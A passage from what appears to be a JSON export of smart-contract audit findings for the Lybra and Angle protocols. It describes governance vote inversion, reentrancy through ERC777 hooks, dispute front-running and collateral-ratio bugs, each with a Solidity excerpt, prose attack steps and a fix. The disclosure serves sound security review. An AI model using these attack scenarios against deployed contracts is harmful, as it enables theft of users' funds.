computation, resulting in OOG.   ## Proof of Concept  In both PeUSD and EUSD vaults, whenever the users mint or burn tokens, the `refreshMintReward` function is called.   ![](https://i.imgur.com/z3jBh29.png)  It makes a call to the [LybraConfigurator](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/configuration/LybraConfigurator.sol#L277-L279)  ```solidity    function refreshMintReward(address user) external {         eUSDMiningIncentives.refreshReward(user);     } ```  Which in turn calls the [EUSDMiningIncentives](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/miner/EUSDMiningIncentives.sol#L72-L82) contract.  ```solidity     modifier updateReward(address _account) {         rewardPerTokenStored = rewardPerToken();         updatedAt = lastTimeRewardApplicable();          if (_account != address(0)) {             rewards[_account] = earned(_account);             userRewardPerTokenPaid[_account] = rewardPerTokenStored;             userUpdatedAt[_account] = block.timestamp;         }         _;     } ```  Observing how the [earned](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/miner/EUSDMiningIncentives.sol#L185-L187) function works  ```solidity     function earned(address _account) public view returns (uint256) {         return ((stakedOf(_account) * getBoost(_account) * (rewardPerToken() - userRewardPerTokenPaid[_account])) / 1e38) + rewards[_account];     } ```  We see that the [stakedOf](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/miner/EUSDMiningIncentives.sol#L136-L147)  call goes through all the available pools.  ```solidity     function stakedOf(address user) public view returns (uint256) {         uint256 amount;         for (uint i = 0; i < pools.length; i++) {             ILybra pool = ILybra(pools[i]);             uint borrowed = pool.getBorrowedOf(user);             if (pool.getVaultType() == 1) {                 borrowed = borrowed * (1e20 + peUSDExtraRatio) / 1e20;             }             amount += borrowed;         }         return amount;     } ```  The problem arises as the `pools` array has no upper limit on its size. As the number of pools grows, the loop will need to perform more iterations. This could result in an excessive amount of computations, which directly translates to high gas costs and potentially longer transaction processing times.  In a worst-case scenario, if the number of pools becomes too large, the gas costs could exceed the block gas limit, rendering it impossible to perform mint or burn transactions, and effectively bricking the payment/repayment system.  Even if a staker has funds only in a single pool, the function will still go through all pools, so that makes it even more unfair.  ## Tools Used  Manual review   ## Recommended Mitigation Steps  When setting pools, set a maximum limit.  ```diff   function setPools(address[] memory _pools) external onlyOwner { +        require(_pools.length <= 5)         for (uint i = 0; i < _pools.length; i++) {             require(configurator.mintVault(_pools[i]), \"NOT_VAULT\");         }         pools = _pools;     } ```      ## Assessed type  Other"}, {"title": "Fixed reward percentage for liquidators in the eUSD vault may cause a liquidation crisis", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/72", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-20"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L154-L176   # Vulnerability details  ## Impact  To not lose generality, the same issue is present in the `LybraPEUSDVaultBase` contract.  Liquidations are essential for a lending protocol to maintain the over-collateralization of the protocol. Hence, when a liquidation happens, it should increment the collateral ratio of the liquidated position (make it healthier).  The `LybraEUSDVaultBase` contract has a function named `liquidation`, which is used to liquidate users whose collateral ratio is below the bad collateral ratio, which for the eUSD Vault is 150%. This function incentives liquidators with a fixed reward of 10% of the collateral being liquidated. However, the issue with the fixed compensation is that it will cause a position to get unhealthier during a liquidation when the collateral ratio is 110% or smaller.   ## Proof of Concept  Take the following example:  - USD / ETH price = 1500 - Collateral amount = 2 ether - Debt = 2779 eUSD  The data above will give us a collateral ratio for the position of: 107.9%. The liquidator liquidates the max amount possible, which is 50% of the collateral, one ether, and takes 10% extra for its services; the final collateral ratio will be:  `((2 - 1.1) * 1500) / (2779 - 1500) = 1.055`  The position got unhealthier after the liquidation, from a collateral ratio of 107.9% to 105%. The process can be repeated until it is no longer profitable for the liquidator leading the protocol to accumulate bad debt.  ## Justification  I landed medium on this finding for the following reasons:  - It has the requirement that the position must have a collateral ratio lower than 110%, which means that it was not liquidated before it reached that point.   - Even though the above point is required for this to become an issue, the position in the example was still overcollateralized (~108%). It should not be possible to liquidate an over-collateralized position and have the consequence of making it unhealthier.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  When a position has a collateral ratio below 110%, the reward percentage should be adjusted accordingly instead of a fixed reward of 10%.                  ## Assessed type  Math"}, {"title": "Liquidation won't work when bad and safe collateral ratio are set to default values", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/44", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-21"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/configuration/LybraConfigurator.sol#L339   # Vulnerability details  ## Impact `getBadCollateralRatio()` will revert because of underflow, if `vaultBadCollateralRatio[pool]` and `vaultSafeCollateralRatio[pool]` are set to 0 (i.e. using default ratios 150% and 130% accordingly). It blocks liquidation flow.  ## Proof of Concept 1e19 is decremented from value `vaultSafeCollateralRatio[pool]` ```solidity     function getBadCollateralRatio(address pool) external view returns(uint256) {         if(vaultBadCollateralRatio[pool] == 0) return vaultSafeCollateralRatio[pool] - 1e19;         return vaultBadCollateralRatio[pool];     } ``` However `vaultSafeCollateralRatio[pool]` can be set to 0, which should mean 160%: ```solidity     function getSafeCollateralRatio(         address pool     ) external view returns (uint256) {         if (vaultSafeCollateralRatio[pool] == 0) return 160 * 1e18;         return vaultSafeCollateralRatio[pool];     } ``` As the result incorrect accounting block liquidation when using default values.  Also I think this is similar issue, but different impact, therefore describe in this issue. BadCollateralRatio can't be set when SafeCollateralRatio is default, as newRatio must be less than 10%: https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/configuration/LybraConfigurator.sol#L127 ```solidity     function setBadCollateralRatio(address pool, uint256 newRatio) external onlyRole(DAO) {         require(newRatio >= 130 * 1e18 && newRatio <= 150 * 1e18 && newRatio <= vaultSafeCollateralRatio[pool] + 1e19, \"LNA\");         ...     } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps Instead of internal accessing variables, use functions `getSafeCollateralRatio()` and `getBadCollateralRatio()` in all the occurences, because variables can be zero.   ## Assessed type  Invalid Validation"}, {"title": "Incorrect function call in LybraRETHVault's getAssetPrice", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/27", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-22"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/pools/LybraRETHVault.sol#L46-L48   # Vulnerability details  ## Impact  The incorrect function call in the code results in the inability to calculate the asset price properly. This will halt all operations associated with the asset pricing, disrupting the functioning of the entire system.   ## Proof of Concept  LybraRETHVault's `getAssetPrice` method currently makes a call to a non-existent function in the rETH contract, `getExchangeRatio()`. The issue appears to be a misunderstanding or miscommunication, as the rETH contract does not provide a `getExchangeRatio()` function. This leads to a failure in the asset price calculation.  ```solidity     function getAssetPrice() public override returns (uint256) {         return (_etherPrice() * IRETH(address(collateralAsset)).getExchangeRatio()) / 1e18;     } ```  The correct function to call is `getExchangeRate()`, which exists in the rETH contract and provides the exchange rate necessary to determine the asset price.   https://etherscan.deth.net/address/0xae78736Cd615f374D3085123A210448E74Fc6393 ![Uploading file...ud2r6]()  ![](https://i.imgur.com/emneslX.png)  https://etherscan.deth.net/address/0xae78736Cd615f374D3085123A210448E74Fc6393 ![](https://i.imgur.com/qk9Ae0y.png)   ## Tools Used  Manual review   ## Recommended Mitigation Steps  To resolve this issue, it is recommended to replace the non-existent function call `getExchangeRatio()` with the correct function `getExchangeRate()`. This correction will ensure that the `getAssetPrice()` method retrieves the correct exchange rate from the rETH contract, allowing the system to calculate the asset price accurately.  ```solidity     function getAssetPrice() public override returns (uint256) {         return (_etherPrice() * IRETH(address(collateralAsset)).getExchangeRate()) / 1e18;     } ```         ## Assessed type  Other"}, {"title": "`_voteSucceeded()` returns true when `againstVotes > forVotes` and vice versa", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/15", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-07"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/26915a826c90eeb829863ec3851c3c785800594b/contracts/lybra/governance/LybraGovernance.sol#L67   # Vulnerability details  ## Impact As a result voting process is broken, as it won't execute proposals with most of `forVotes`. But instead it will execute proposals with most of `againstVotes`.  ## Proof of Concept It returns whether number of votes with support = 1 is greater than with support = 0 ```solidity     function _voteSucceeded(uint256 proposalId) internal view override returns (bool){         return proposalData[proposalId].supportVotes[1] > proposalData[proposalId].supportVotes[0];     } ```  However support = 1 means `againstVotes`, and support = 0 means `forVotes`: https://github.com/code-423n4/2023-06-lybra/blob/26915a826c90eeb829863ec3851c3c785800594b/contracts/lybra/governance/LybraGovernance.sol#L120-L122 ```solidity     function proposals(uint256 proposalId) external view returns (...) {         ...                  forVotes =  proposalData[proposalId].supportVotes[0];         againstVotes =  proposalData[proposalId].supportVotes[1];         abstainVotes =  proposalData[proposalId].supportVotes[2];          ...     } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps Swap 1 and 0: ```solidity     function _voteSucceeded(uint256 proposalId) internal view override returns (bool){         return proposalData[proposalId].supportVotes[0] > proposalData[proposalId].supportVotes[1];     } ```   ## Assessed type  Governance"}, {"title": "Governance wrongly calculates `_quorumReached()`", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/14", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-08"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/26915a826c90eeb829863ec3851c3c785800594b/contracts/lybra/governance/LybraGovernance.sol#L60   # Vulnerability details  ## Impact For some reason it is calculated as sum of againstVotes and abstainVotes instead of totalVotes on proposal. As the result, quorum will be reached only if >=1/3 of all votes are abstain or against, which doesn't make sense.  ## Proof of Concept Number of votes with support = 1 and support = 2 is summed up ```solidity     function _quorumReached(uint256 proposalId) internal view override returns (bool){         return proposalData[proposalId].supportVotes[1] + proposalData[proposalId].supportVotes[2] >= quorum(proposalSnapshot(proposalId));     } ``` However support = 1 means against votes, support = 2 means abstain votes: https://github.com/code-423n4/2023-06-lybra/blob/26915a826c90eeb829863ec3851c3c785800594b/contracts/lybra/governance/LybraGovernance.sol#L120-L122 ```solidity     function proposals(uint256 proposalId) external view returns (...) {         ...                  forVotes =  proposalData[proposalId].supportVotes[0];         againstVotes =  proposalData[proposalId].supportVotes[1];         abstainVotes =  proposalData[proposalId].supportVotes[2];          ...     } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps Use totalVotes: ```solidity     function _quorumReached(uint256 proposalId) internal view override returns (bool){         return proposalData[proposalId].totalVotes >= quorum(proposalSnapshot(proposalId));     } ```   ## Assessed type  Governance"}, {"title": "The relation between the safe collateral ratio and the bad collateral ratio for the PeUSD vaults is not enforced correctly", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/3", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-23"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/26915a826c90eeb829863ec3851c3c785800594b/contracts/lybra/configuration/LybraConfigurator.sol#L127 https://github.com/code-423n4/2023-06-lybra/blob/26915a826c90eeb829863ec3851c3c785800594b/contracts/lybra/configuration/LybraConfigurator.sol#L202   # Vulnerability details  ## Impact  The documentation states that:   `The PeUSD vault requires a safe collateral rate at least 10% higher than the liquidation collateral rate, providing an additional buffer to protect against liquidation risks.`  Hence it is important to maintain the invariance between the relation of the safe collateral ratio (SCR) and the bad collateral ratio (BCR). Both functions `setSafeCollateralRatio` and `setBadCollateralRatio` at the `LybraConfigurator` contract make checks to ensure that the relation always holds.  The former is coded as:  ```solidity function setSafeCollateralRatio(address pool, uint256 newRatio) external checkRole(TIMELOCK) {    if(IVault(pool).vaultType() == 0) {       require(newRatio >= 160 * 1e18, \"eUSD vault safe collateralRatio should more than 160%\");    } else {       // @audit-ok SCR is always at least 10% greater than BCR.       require(newRatio >= vaultBadCollateralRatio[pool] + 1e19, \"PeUSD vault safe collateralRatio should more than bad collateralRatio\");      }     vaultSafeCollateralRatio[pool] = newRatio;    emit SafeCollateralRatioChanged(pool, newRatio); } ```  The latter is coded as:  ```solidity function setBadCollateralRatio(address pool, uint256 newRatio) external onlyRole(DAO) {   // @audit-issue BCR and SCR relationship is not enforced correctly.   require(newRatio >= 130 * 1e18 && newRatio <= 150 * 1e18 && newRatio <= vaultSafeCollateralRatio[pool] + 1e19, \"LNA\");      vaultBadCollateralRatio[pool] = newRatio;      emit SafeCollateralRatioChanged(pool, newRatio); } ```  We take only the logic clause related to the relationship between the BCR and SCR:  ```solidity require(newRatio <= vaultSafeCollateralRatio[pool] + 1e19); ```  We can see that the relationship is not coded correctly, we want the SCR always to be at least 10% higher than the BCR, so the correct check should be:  ```solidity require(newRatio <= vaultSafeCollateralRatio[pool] - 1e19); ```  ## Proof of Concept  There is a path of actions that can lead to an SCR and a BCR that do not meet the requirement stated previously. For example:  - 1.- SCR is set to 150% - 2.- BCR is also set to 150% (Incorrect requirement pass: 150% <= 150% + 10%)  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Change:   ```solidity require(newRatio >= 130 * 1e18 && newRatio <= 150 * 1e18 && newRatio <= vaultSafeCollateralRatio[pool] + 1e19, \"LNA\"); ```  to:   ```solidity require(newRatio >= 130 * 1e18 && newRatio <= 150 * 1e18 && newRatio <= vaultSafeCollateralRatio[pool] - 1e19, \"LNA\"); ```                 ## Assessed type  Invalid Validation"}, {"title": "LibHelpers.piecewiseLinear will revert when the value is less than the first element of the array", "html_url": "https://github.com/code-423n4/2023-06-angle-findings/issues/40", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-06-angle-findings", "body": "# Lines of code  https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Redeemer.sol#L156-L157 https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/libraries/LibSetters.sol#L230-L240 https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/libraries/LibHelpers.sol#L77-L80   # Vulnerability details  ## Impact `LibHelpers.piecewiseLinear` reverts when the value is less than the first element of the array. This method is used in Redeemer contract and if the collateral ratio is below the first element of xRedemptionCurve, the redepmtion will revert.  ## Proof of Concept   In `Redeemer._quoteRedemptionCurve`, a penalty factor is applied when the protocol is under-collateralized using `LibHelpers.piecewiseLinear`.  Redeemer.sol#L156-L157 ```solidity         uint64[] memory xRedemptionCurveMem = ts.xRedemptionCurve;         penaltyFactor = uint64(LibHelpers.piecewiseLinear(collatRatio, xRedemptionCurveMem, yRedemptionCurveMem)); ```  `xRedemptionCurveMem` is strictly increasing and upper bounded by `BASE_9`, and there's no more limitations.  LibSetters.sol ```solidity 230        (action == ActionType.Redeem && (xFee[n - 1] > BASE_9 || yFee[n - 1] < 0 || yFee[n - 1] > int256(BASE_9)))             233        for (uint256 i = 0; i < n - 1; ++i) { 234            if (             240                (action == ActionType.Redeem && (xFee[i] >= xFee[i + 1] || yFee[i] < 0 || yFee[i] > int256(BASE_9))) ``` So `collatRatio` can be less than the first element of `xRedemptionCurveMem`. In that case, `LibHelpers.findLowerBound` will return 0 and `LibHelpers.piecewiseLinear` will revert on the following line.  LibHelpers.sol#L77-L80  ```solidity     return         yArray[indexLowerBound] +         ((yArray[indexLowerBound + 1] - yArray[indexLowerBound]) * int64(x - xArray[indexLowerBound])) /         int64(xArray[indexLowerBound + 1] - xArray[indexLowerBound]); ``` `Redeemer._redeem` calls `_quoteRedemptionCurve`, so the redemption will be blocked in this case.  ## Tools Used Manual Review  ## Recommended Mitigation Steps  We can add the following line to mitigate this issue.  ```solidity     if (indexLowerBound == 0 && x < xArray[0]) return yArray[0]; ```   ## Assessed type  Under/Overflow"}, {"title": "Read-only reentrancy is possible", "html_url": "https://github.com/code-423n4/2023-06-angle-findings/issues/30", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-06-angle-findings", "body": "# Lines of code  https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Swapper.sol#L206 https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Redeemer.sol#L131 https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L110   # Vulnerability details  ## Impact The agToken might be minted wrongly as rewards due to the reentrancy attack.  ## Proof of Concept There are `redeem/swap` logics in the `transmuter` contract and all functions don't have a `nonReentrant` modifier.  So the typical reentrancy attack is possible during `redeem/swap` as I mentioned in my other report.  But besides that, the read-only reentrancy attack is possible from the `SavingsVest` contract, and the agToken might be minted/burnt incorrectly like this.  1. The [collatRatio](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L108) is `BASE_9(100%)` now and Alice starts a swap from collateral to agToken in `Swapper` contract. 2. In `_swap()`, it mints the agToken after depositing the collaterals.  ```solidity     if (mint) {         uint128 changeAmount = (amountOut.mulDiv(BASE_27, ts.normalizer, Math.Rounding.Up)).toUint128();         // The amount of stablecoins issued from a collateral are not stored as absolute variables, but         // as variables normalized by a `normalizer`         collatInfo.normalizedStables += uint216(changeAmount);         ts.normalizedStables += changeAmount;         if (permitData.length > 0) {             PERMIT_2.functionCall(permitData);         } else if (collatInfo.isManaged > 0)             IERC20(tokenIn).safeTransferFrom(                 msg.sender,                 LibManager.transferRecipient(collatInfo.managerData.config),                 amountIn             );         else IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn); //@audit reentrancy         if (collatInfo.isManaged > 0) {             LibManager.invest(amountIn, collatInfo.managerData.config);         }         IAgToken(tokenOut).mint(to, amountOut);     } ```  After depositing the collaterals, Alice might have a hook in the case of ERC777 tokens before the agToken is minted.  3. Then Alice calls `SavingsVest.accrue()` inside the hook and [getCollateralRatio()](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L108) will return the incorrect ratio as the agToken isn't minted yet. 4. So `collatRatio` will be [larger than the real value](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/libraries/LibGetters.sol#L87) and additional rewards would be minted if `collatRatio > BASE_9 + BASE_6`.  Then Alice would get more rewards from the `SavingsVest`.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Recommend adding the `nonReentrant` modifer to [getCollateralRatio()](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Getters.sol#L78) as well as `redeem()/swap()` functions.   ## Assessed type  Reentrancy"}, {"title": "`estimatedAPR()` might return the wrong APR.", "html_url": "https://github.com/code-423n4/2023-06-angle-findings/issues/28", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-06-angle-findings", "body": "# Lines of code  https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L183   # Vulnerability details  ## Impact `estimatedAPR()` might return the wrong APR and it will make users confused.  ## Proof of Concept `SavingsVest.estimatedAPR()` returns the APR using the current `vestingProfit` and `vestingPeriod`.  ```solidity     function estimatedAPR() external view returns (uint256 apr) {         uint256 currentlyVestingProfit = vestingProfit;         uint256 weightedAssets = vestingPeriod * totalAssets();         if (currentlyVestingProfit != 0 && weightedAssets != 0)             apr = (currentlyVestingProfit * 3600 * 24 * 365 * BASE_18) / weightedAssets;     } ```  First of all, it uses the current `vestingRatio = vestingProfit / vestingPeriod` for 1 year even if `vestingPeriod < 1 year`. I think it might be an intended behavior to estimate the APR with the current vesting ratio.  But it's wrong to use the same vesting ratio after the vesting period is finished already.  In [accrue()](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L110), it updates the `vestingProfit` and `lastUpdate` only when it's overcollateralized/undercollateralized more than 0.1%.  So `lastUpdate` wouldn't be changed for a certain time while [collatRatio](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L110) is in range (99.9%, 100.1%).  1. At the first time, `vestingProfit = 100, vestingPeriod = 10 days` and `estimatedAPR()` returns the correct value. 2. After 10 days, all vestings are unlocked and there is no locked profit. But `accrue()` has never been called due to the stable collateral ratio. 3. In `estimatedAPR()`, `vestingProfit` will be 100 and it will return the same APR as 10 days before. 4. But the APR should be 0 as there is no locked profit now.  ## Tools Used Manual Review  ## Recommended Mitigation Steps `estimatedAPR()` should return 0 when `lockedProfit() == 0`.  ```solidity     function estimatedAPR() external view returns (uint256 apr) {         if (lockedProfit() == 0) return 0; //check locked profit first          uint256 currentlyVestingProfit = vestingProfit;         uint256 weightedAssets = vestingPeriod * totalAssets();         if (currentlyVestingProfit != 0 && weightedAssets != 0)             apr = (currentlyVestingProfit * 3600 * 24 * 365 * BASE_18) / weightedAssets;     } ```   ## Assessed type  Other"}, {"title": "Possible reentrancy during redemption/swap", "html_url": "https://github.com/code-423n4/2023-06-angle-findings/issues/24", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-06-angle-findings", "body": "# Lines of code  https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Redeemer.sol#L131   # Vulnerability details  ## Impact Redeemers might charge more collaterals during redemption/swap by the reentrancy attack.  ## Proof of Concept Redeemers can redeem the agToken for collaterals in `Redeemer` contract and `_redeem()` burns the agToken and transfers the collaterals.  ```solidity     function _redeem(         uint256 amount,         address to,         uint256 deadline,         uint256[] memory minAmountOuts,         address[] memory forfeitTokens     ) internal returns (address[] memory tokens, uint256[] memory amounts) {         TransmuterStorage storage ts = s.transmuterStorage();         if (ts.isRedemptionLive == 0) revert Paused();         if (block.timestamp > deadline) revert TooLate();         uint256[] memory subCollateralsTracker;         (tokens, amounts, subCollateralsTracker) = _quoteRedemptionCurve(amount);         // Updating the normalizer enables to simultaneously and proportionally reduce the amount         // of stablecoins issued from each collateral without having to loop through each of them         _updateNormalizer(amount, false);          IAgToken(ts.agToken).burnSelf(amount, msg.sender); //@audit-info burn agToken          address[] memory collateralListMem = ts.collateralList;         uint256 indexCollateral;         for (uint256 i; i < amounts.length; ++i) {             if (amounts[i] < minAmountOuts[i]) revert TooSmallAmountOut();             // If a token is in the `forfeitTokens` list, then it is not sent as part of the redemption process             if (amounts[i] > 0 && LibHelpers.checkList(tokens[i], forfeitTokens) < 0) {                 Collateral storage collatInfo = ts.collaterals[collateralListMem[indexCollateral]];                 if (collatInfo.onlyWhitelisted > 0 && !LibWhitelist.checkWhitelist(collatInfo.whitelistData, to))                     revert NotWhitelisted();                 if (collatInfo.isManaged > 0)                     LibManager.release(tokens[i], to, amounts[i], collatInfo.managerData.config);                 else IERC20(tokens[i]).safeTransfer(to, amounts[i]); //@audit reentrancy             }             if (subCollateralsTracker[indexCollateral] - 1 <= i) ++indexCollateral;         }         emit Redeemed(amount, tokens, amounts, forfeitTokens, msg.sender, to);     } ```  During the collateral transfers(direct transfer or in `LibManager.release()`), there might be a hook for the recipient in the case of ERC777 tokens.  Then the recipient might charge more collaterals by reentrancy like this.  1. Let's suppose there are 2 collaterals `colA` and `colB`. The transmuter contract contains 1000 amounts of `colA` and `colB`. Alice has 20 amounts of agToken. 2. At the first time, Alice calls `redeem()` with 10 amounts of agToken and she should receive 10 amounts of `colA` and `colB`. 3. As `colA` is an ERC777 token, she calls `redeem(10)` again inside the hook after the [colA transfer](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Redeemer.sol#L131). 4. During the second redemption, total collaterals will be `colA = 990, colB = 1000` because `colB` isn't transferred in the first redemption yet. 5. After all, Alice will receive more collaterals in the second redemption from [this calculation](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Redeemer.sol#L167).  I think a similar reentrancy attack might be possible during the swap as well.  ## Tools Used Manual Review  ## Recommended Mitigation Steps I think we should add the `nonReentrant` modifier to the major functions like `redeem()/swap()`.   ## Assessed type  Reentrancy"}, {"title": "The first disputer might lose funds although his dispute is valid.", "html_url": "https://github.com/code-423n4/2023-06-angle-findings/issues/23", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2023-06-angle-findings", "body": "# Lines of code  https://github.com/AngleProtocol/merkl-contracts/blob/1825925daef8b22d9d6c0a2bc7aab3309342e786/contracts/Distributor.sol#L234   # Vulnerability details  ## Impact The first disputer might lose funds although his dispute is valid.  ## Proof of Concept Users can dispute the current tree using `disputeTree()` and the governor refunds the dispute funds if the dispute is valid in `resolveDispute()`.  ```solidity     function disputeTree(string memory reason) external {         if (block.timestamp >= endOfDisputePeriod) revert InvalidDispute();         IERC20(disputeToken).safeTransferFrom(msg.sender, address(this), disputeAmount);         disputer = msg.sender;         emit Disputed(reason);     }      /// @notice Resolve the ongoing dispute, if any     /// @param valid Whether the dispute was valid     function resolveDispute(bool valid) external onlyGovernorOrGuardian {         if (disputer == address(0)) revert NoDispute();         if (valid) {             IERC20(disputeToken).safeTransfer(disputer, disputeAmount);             // If a dispute is valid, the contract falls back to the last tree that was updated             _revokeTree();         } else {             IERC20(disputeToken).safeTransfer(msg.sender, disputeAmount);             endOfDisputePeriod = _endOfDisputePeriod(uint48(block.timestamp));         }         disputer = address(0);         emit DisputeResolved(valid);     } ```  But `disputeTree()` can be called again by another disputer although there is an active disputer and `resolveDispute()` refunds to the last disputer only.  In the worst case, a valid disputer might lose the dispute funds by malicious frontrunners. 1. A valid disputer creates a dispute using `disputeTree()`. 2. As it's valid, the governor calls `resolveDispute(valid = true)` to accept the dispute and refund the funds. 3. A malicious user calls `disputeTree()` by front running. 4. Then during `resolveDispute(true)`, the dispute funds will be sent to the second disputer and the first disputer will lose the funds although he's valid.  ## Tools Used Manual Review  ## Recommended Mitigation Steps `disputeTree()` shouldn't allow another dispute when there is an active dispute already.   ## Assessed type  Invalid Validation"}, {"title": "Interest is not accrued before parameters are updated in `SavingsVest`", "html_url": "https://github.com/code-423n4/2023-06-angle-findings/issues/13", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-06-angle-findings", "body": "# Lines of code  https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L196   # Vulnerability details  ## Impact Stablecoin holders can receive wrongly calculated yield in the `SavingsVest` contract. Also, wrong vesting profit can be slashed when the protocol is under-collateralized. ## Proof of Concept The [SavingsVest](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L15) contract lets users deposit their stablecoins and earn vested yield when the stablecoin in the Transmuter protocol is over-collateralized. The interest is accrued via calls to the [SavingsVest.accrue](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L103) function.  There are two parameters that affect the profit of depositors: 1. [protocolSafetyFee](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L115) is the fees paid to the protocol; 1. [vestingPeriod](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L149) is the period when the yield remains locked.  The two parameters can be changed via the [setParams](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L196) function. However, before they're changed, the current interest is not accrued. E.g. this may lead to: 1. If `protocolSafetyFee` is increased without accruing interest, the next accrual will happen at the increased fees, which will reduce the rewards for the depositors. 1. If `vestingPeriod` is increased without accruing interest, the yield will be [locked for a longer 